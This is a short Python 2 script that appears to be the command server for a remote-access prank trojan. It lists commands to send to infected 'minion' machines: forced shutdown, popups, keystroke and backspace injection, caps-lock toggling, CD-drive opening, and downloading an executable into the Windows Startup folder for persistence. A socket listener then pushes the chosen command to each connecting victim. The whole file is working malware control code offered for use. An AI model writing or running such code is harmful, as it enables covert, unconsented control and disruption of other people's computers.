#!/usr/bin/python
import socket
print('''
(s) = Spoil your non-excistance. Since it creates a file on the desktop.
- shutdown: Initates a shutdown command.
- test: Starts the calculator.
- cancel: Stops any current shutdown commands AND terminates all 'wscript.exe' processes.
- message [input text](s): Makes a popup box with custom text. NOTE: You cant include any words that also is commands currently.
- disable: stops the minion process.
- opencd: opens the cd drive continuously.
- togglecaps(s): Continuously toggle capslock, disable with 'cancel' command.
- backspaces(s): Continuously use backspace, disable with 'cancel' command.
- ghostkeys [input text](s): Make custom keystroke on Minion.
- cleanup: Removes .vbs files your desktop.
- install: Downloads the latest .exe version and places it in the windows 'start folder'.
- uninstall: Removes the .exe file in start folder.
- restart: Full of bugs currently don't touch for your own good. Original description: Only to be used after install command. Only starts the process in 'start folder'.
''')
command = raw_input("Enter your command, commander: ")
s = socket.socket()
print("Socket successfully created")
port = 12345
s.bind(('', port))
print("socket binded to %s" %(port))
s.listen(5)
print("socket is listening")
while True:
    c, addr = s.accept()
    print('Got connection from', addr)
    c.send(command)
    c.close()
